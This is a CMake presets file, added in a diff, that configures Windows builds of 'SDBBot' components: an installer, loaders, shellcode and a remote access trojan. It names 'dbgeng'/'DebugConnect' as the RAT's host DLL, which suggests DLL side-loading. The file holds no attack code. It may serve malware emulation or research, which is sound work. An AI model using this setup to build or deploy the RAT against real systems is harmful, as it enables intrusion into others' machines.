@@ -1,0 +1,163 @@
+{
+  "version": 6,
+  "cmakeMinimumRequired": {
+    "major": 3,
+    "minor": 26,
+    "patch": 0
+  },
+  "configurePresets": [
+    {
+      "name": "default",
+      "binaryDir": "${sourceDir}/build",
+      "installDir": "${sourceDir}/install",
+      "generator": "Ninja Multi-Config",
+      "architecture": {
+        "value": "x64",
+        "strategy": "external"
+      },
+        "cacheVariables": {
+            "CMAKE_MODULE_PATH": "${sourceDir}/cmake",
+            "CMAKE_CXX_STANDARD": "26",
+            "CMAKE_C_STANDARD": "23",
+            "CMAKE_CONFIGURATION_TYPES": "Debug;Release;",
+            "CMAKE_MSVC_RUNTIME_LIBRARY": "MultiThreaded$<$<CONFIG:Debug>:Debug>"
+        },
+      "condition": {
+        "type": "equals",
+        "lhs": "${hostSystemName}",
+        "rhs": "Windows"
+      }
+    }
+  ],
+  "buildPresets": [
+    {
+      "name": "release",
+      "description": "Build SDBBot targets with release configuration",
+      "configurePreset": "default",
+      "inheritConfigureEnvironment": true,
+      "configuration": "Release",
+      "environment": {
+        "RAT_HOST_DLL": "dbgeng",
+        "RAT_HOST_DLL_EXPORT": "DebugConnect"
+      },
+      "targets": [
+        "installer",
+        "loader",
+        "alternative-loader",
+        "shellcode",
+        "rat",
+        "installer-runner",
+        "loader-runner",
+        "shellcode-runner",
+        "rat-runner",
+        "sdbbot-test"
+      ]
+    },
+    {
+      "name": "debug",
+      "description": "Build SDBBot targets with debug configuration",
+      "configurePreset": "default",
+      "inheritConfigureEnvironment": true,
+      "configuration": "Debug",
+      "environment": {
+        "RAT_HOST_DLL": "dbgeng",
+        "RAT_HOST_DLL_EXPORT": "DebugConnect"
+      },
+      "targets": [
+        "installer",
+        "loader",
+        "alternative-loader",
+        "shellcode",
+        "rat",
+        "installer-runner",
+        "loader-runner",
+        "shellcode-runner",
+        "rat-runner",
+        "sdbbot-test"
+      ]
+    }
+  ],
+  "testPresets": [
+    {
+      "name": "installer-debug",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true,
+      "filter": {
+        "include": {
+          "name":  "Installer.*"
+        }
+      }
+    },
+    {
+      "name": "loader-debug",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true,
+      "filter": {
+        "include": {
+          "name":  "Loader.*"
+        }
+      }
+    },
+    {
+      "name": "shellcode",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true
+    },
+    {
+      "name": "rat",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true
+    },
+    {
+      "name": "all",
+      "configurePreset": "default",
+      "configuration": "Debug",
+      "inheritConfigureEnvironment": true,
+      "output": {
+        "outputOnFailure": true
+      }
+    }
+  ],
+  "workflowPresets": [
+    {
+      "name": "cicd-debug",
+      "description": "Build all SDBBot debug targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "debug"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    },
+    {
+      "name": "cicd-release",
+      "description": "Build all SDBBot release targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "release"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    }
+  ]
+}
